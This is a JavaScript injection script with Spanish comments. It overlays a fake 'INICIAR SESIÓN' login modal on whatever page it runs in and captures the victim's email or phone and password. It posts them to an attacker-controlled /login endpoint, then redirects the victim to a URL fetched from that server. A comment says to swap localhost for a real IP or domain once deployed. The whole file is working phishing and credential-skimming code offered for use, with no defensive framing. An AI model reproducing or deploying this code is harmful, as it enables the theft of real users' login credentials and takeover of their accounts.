(function() {
    // Configuración del servidor (Cambia localhost por tu IP o dominio real cuando lo subas)
    const SERVER_URL = "http://localhost:3000";

    // Crear el contenedor del modal
    const overlay = document.createElement('div');
    overlay.id = 'app-injector-overlay';
    overlay.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:999999;display:flex;justify-content:center;align-items:center;font-family:Arial,sans-serif;";

    // Insertar el HTML del formulario (basado en tu index.html)
    overlay.innerHTML = `
        <div style="background:white;padding:30px;border-radius:12px;width:90%;max-width:380px;box-shadow:0 10px 25px rgba(0,0,0,0.5);text-align:center;">
            <div style="font-size:28px;font-weight:bold;color:#2563eb;margin-bottom:20px;">INICIAR SESIÓN</div>
            <input id="inj-email" type="text" placeholder="Correo o teléfono" style="width:100%;padding:12px;margin-bottom:10px;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;">
            <input id="inj-pass" type="password" placeholder="Contraseña" style="width:100%;padding:12px;margin-bottom:15px;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;">
            <button id="inj-btn" style="width:100%;padding:14px;background:#2563eb;color:white;border:none;border-radius:6px;font-weight:bold;cursor:pointer;">Entrar</button>
        </div>
    `;

    document.body.appendChild(overlay);

    // Lógica de envío
    document.getElementById('inj-btn').onclick = async function() {
        const email = document.getElementById('inj-email').value;
        const password = document.getElementById('inj-pass').value;
        const btn = this;

        if(!email || !password) return alert("Completa los datos");

        btn.disabled = true;
        btn.innerText = "Verificando...";

        try {
            // Guardar datos
            await fetch(`${SERVER_URL}/login`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ email, password })
            });

            // Obtener redirección
            const resConfig = await fetch(`${SERVER_URL}/config`);
            const config = await resConfig.json();

            // Redirigir
            setTimeout(() => {
                window.location.href = config.redirect_url;
            }, 1000);

        } catch(e) {
            alert("Error de conexión");
            btn.disabled = false;
            btn.innerText = "Entrar";
        }
    };
})();